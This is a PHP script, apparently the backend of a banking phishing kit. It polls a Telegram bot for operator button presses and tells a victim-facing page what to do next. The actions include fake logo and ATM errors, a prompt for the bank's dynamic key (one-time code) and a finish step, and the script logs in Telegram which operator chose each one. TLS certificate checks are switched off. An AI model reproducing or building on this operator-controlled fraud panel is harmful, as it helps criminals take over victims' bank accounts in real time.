<?php
session_start();
header('Content-Type: application/json');

$configPath = __DIR__ . '/../config.php';
if (!file_exists($configPath)) {
    echo json_encode(['action' => null, 'error' => 'Falta config.php']);
    exit;
}
$config = require $configPath;

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (!$transactionId || !$messageId) {
    echo json_encode(['action' => null, 'error' => 'Faltan datos']);
    exit;
}

// Revisar si hay acción en sesión
if (
    isset($_SESSION['current_transaction'], $_SESSION['current_action']) &&
    $_SESSION['current_transaction'] === $transactionId
) {
    $action = $_SESSION['current_action'];
    unset($_SESSION['current_transaction'], $_SESSION['current_action']);
    echo json_encode(['action' => $action]);
    exit;
}

// Consultar Telegram getUpdates
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$action = null;
$lastUpdateId = null;

if (!empty($data['result']) && is_array($data['result'])) {
    foreach ($data['result'] as $update) {
        $lastUpdateId = $update['update_id'];

        if (
            isset($update['callback_query']) &&
            isset($update['callback_query']['data']) &&
            strpos($update['callback_query']['data'], $transactionId) !== false
        ) {
            $callbackData = $update['callback_query']['data'];
            $callbackTime = $update['callback_query']['message']['date'] ?? time();
            $now = time();

            if (($now - $callbackTime) <= 30) {
                list($actionType) = explode(':', $callbackData);
                $allowedActions = [
                    'error_logo',
                    'error_cajero',
                    'pedir_dinamica',
                    'error_dinamica',
                    'confirm_finalizar'
                ];

                if (in_array($actionType, $allowedActions)) {
                    $action = $actionType;

                    $from = $update['callback_query']['from'] ?? [];
                    $operador = !empty($from['username']) ? '@' . $from['username'] : trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
                    if (empty($operador)) $operador = 'Operador';

                    $origText = $update['callback_query']['message']['text'] ?? '';
                    if ($origText !== '') {
                        $newText  = $origText;
                        $newText .= "\n\n————————————\n";
                        $newText .= "✅ Acción: <b>{$actionType}</b>\n";
                        $newText .= "👤 Operador: <b>{$operador}</b>";

                        $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($ch, CURLOPT_POST, true);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
                            'chat_id' => $config['chat_id'],
                            'message_id' => $messageId,
                            'text' => $newText,
                            'parse_mode' => 'HTML',
                            'reply_markup' => json_encode(['inline_keyboard' => []])
                        ]));
                        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                        curl_exec($ch);
                        curl_close($ch);
                    }
                    break;
                }
            }
        }
    }

    // Marcar updates como leídos
    if ($lastUpdateId !== null) {
        $next = $lastUpdateId + 1;
        $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset={$next}");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

echo json_encode(['action' => $action]);
?>
